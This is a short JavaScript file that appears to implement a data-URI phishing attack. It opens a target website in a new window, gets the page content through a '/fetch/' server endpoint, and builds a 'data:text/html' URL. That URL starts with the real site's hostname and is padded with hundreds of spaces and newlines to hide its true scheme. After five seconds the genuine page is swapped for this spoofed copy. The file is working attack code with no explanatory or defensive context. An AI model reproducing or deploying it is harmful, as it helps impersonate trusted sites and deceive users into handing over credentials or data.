var whitespace = Array(800).join(' ')
var underscores = Array(800).join('\n')

function replaceURL(targetURL) {
  var dataURL_Prefix, startIndex, noProtocolURL;
  var targetURL_length = targetURL.length;

  if (targetURL.indexOf('http://') > -1) {
    startIndex = 'http://'.length;
  }
  else if (targetURL.indexOf('https://') > -1) {
    startIndex = 'https://'.length;
  }
  else {
    1/0;
  }
  noProtocolURL = targetURL.slice(startIndex, targetURL_length);
  // dataURL_Prefix = 'data:text/html;' + targetURL;
  dataURL_Prefix = 'data:text/html;' + noProtocolURL;
  return dataURL_Prefix;
}

function buildDataURL(window, targetURL, cback) {
  var callback = function(data) {
    var dataURL = replaceURL(targetURL) + '_' + whitespace + underscores + ',' + whitespace + escape(data);
    console.log(dataURL);
    cback(dataURL);
  }
  var POST_URL = '/fetch/';
  var data = {
    "targetURL": targetURL,
    "userID": user_id
  };
  $.post(POST_URL, data, callback);
}


function initialize(targetURL, changeFocus, fakeRedirect) {
  var WAIT_TIME = 1000;
  var newWindow = window.open(targetURL, 'target');

  if (changeFocus && !fakeRedirect) {
    window.focus();
  }
  else if (fakeRedirect) {
    console.log("not implemented");
  }
  var callback = function(dataURL) { setTimeout(function() {newWindow.location.replace(dataURL, window);}, 5000);};
  buildDataURL(newWindow, targetURL, callback);
}
